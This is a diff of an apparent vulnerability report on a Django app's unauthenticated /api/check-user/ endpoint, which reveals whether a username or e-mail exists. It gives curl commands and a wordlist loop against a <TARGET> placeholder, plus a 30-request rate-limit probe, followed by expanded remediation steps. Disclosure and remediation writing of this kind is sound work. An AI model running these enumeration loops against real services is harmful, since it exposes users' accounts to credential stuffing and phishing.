@@ -1,6 +1,6 @@
 # Description
 
-Username / e-mail enumeration (CWE-203 — Observable Discrepancy) via the unauthenticated boolean oracle `GET /api/check-user/?email=<candidate>`. The endpoint returns `{"exists": true|false}` based on whether an account matches, with **no authentication, rate-limiting, or CAPTCHA**. It matches against both usernames (`arthur`) and registered e-mails (`arthur@tbox.traced`), doubling the attack surface and letting an anonymous attacker enumerate the entire user base from a wordlist.
+Username / e-mail enumeration (CWE-203 — Observable Discrepancy) via the unauthenticated boolean oracle `GET /api/check-user/?email=<candidate>`. The endpoint returns `{"exists": true|false}` based on whether an account matches, with **no authentication, rate-limiting, or CAPTCHA**. It matches (exact, case-sensitive) against both usernames (`johndoe`) and registered e-mails (`john.doe@tbox.traced`), doubling the attack surface and letting an anonymous attacker enumerate the entire user base from a wordlist.
 
 # Exploitation
 
@@ -19,8 +19,9 @@ No cookie, no header, no anti-bot control — only network access is required.
 **1. Confirm the unauthenticated oracle:**
 
 ```bash
-curl -i "http://<TARGET>/api/check-user/?email=arthur"
+curl -i "http://<TARGET>/api/check-user/?email=johndoe"
 # HTTP/1.1 200 OK
+# Content-Type: application/json
 # {"exists": true}
 ```
 
@@ -29,13 +30,14 @@ curl -i "http://<TARGET>/api/check-user/?email=arthur"
 **2. Drive it with a wordlist:**
 
 ```bash
-for c in arthur admin johndoe nonexistent_xyz fake@example.com; do
+for c in admin johndoe janedoe nonexistent_xyz fake@example.com; do
   echo "$c → $(curl -s "http://<TARGET>/api/check-user/?email=$c")"
 done
-# arthur          → {"exists": true}
-# admin           → {"exists": true}
-# johndoe         → {"exists": true}
-# nonexistent_xyz → {"exists": false}
+# admin            → {"exists": true}
+# johndoe          → {"exists": true}
+# janedoe          → {"exists": true}
+# nonexistent_xyz  → {"exists": false}
+# fake@example.com → {"exists": false}
 ```
 
 ![Bulk enumeration loop output](check-user-bulk-enumeration.png)
@@ -43,10 +45,18 @@ done
 **3. Dual matching on username *and* e-mail:**
 
 ```bash
-curl -s "http://<TARGET>/api/check-user/?email=admin@tbox.traced"   # {"exists": true}
+curl -s "http://<TARGET>/api/check-user/?email=admin@tbox.traced"     # {"exists": true}
+curl -s "http://<TARGET>/api/check-user/?email=john.doe@tbox.traced"  # {"exists": true}
 ```
 
 ![Oracle matches both username and registered e-mail](check-user-boolean-oracle-terminal.png)
+
+**4. No rate limit:** 30 consecutive requests from the same client all returned `200 OK` with no throttling, lockout or CAPTCHA:
+
+```bash
+for i in $(seq 1 30); do curl -s -o /dev/null -w "%{http_code} " "http://<TARGET>/api/check-user/?email=probe$i"; done
+# 200 200 200 ... 200
+```
 
 # Risk
 
@@ -60,10 +70,12 @@ Overall severity: **Medium** — unauthenticated, machine-readable, no rate-limi
 
 # Remediation
 
-1. **Require authentication / move the check behind the CSRF-protected signup & reset flows** that legitimately need it.
-2. **Return a uniform, non-committal response** for all states.
-3. **Rate-limit per IP and add CAPTCHA** on the flows that use this check internally.
-4. **Audit login/reset/resend-verification** for the same observable-discrepancy anti-pattern.
+1. **Remove public account-existence disclosure** — remove unnecessary public account-existence checks. Perform required account validation internally within the legitimate registration and account recovery workflows.
+2. **Enforce authentication and authorisation where required** — restrict any retained private account lookup functionality using Django's authentication and permission mechanisms. Only disclose account information to explicitly authorised callers.
+3. **Return uniform responses** — ensure that public registration, login, password reset and verification workflows provide consistent response bodies, HTTP status codes and processing times without disclosing account existence.
+4. **Implement abuse prevention controls** — enforce appropriate server-side rate limiting and introduce CAPTCHA or equivalent automated-abuse protections where justified. Maintain Django's CSRF protection independently for state-changing requests.
+5. **Audit related authentication workflows** — review account registration, authentication, password recovery and verification functionality for inconsistent disclosure of sensitive account information.
+6. **Add regression tests** — extend the relevant Django API and account tests to verify response consistency, access controls, account information confidentiality and rate-limiting enforcement.
 
 # Author
 Hackrapovic
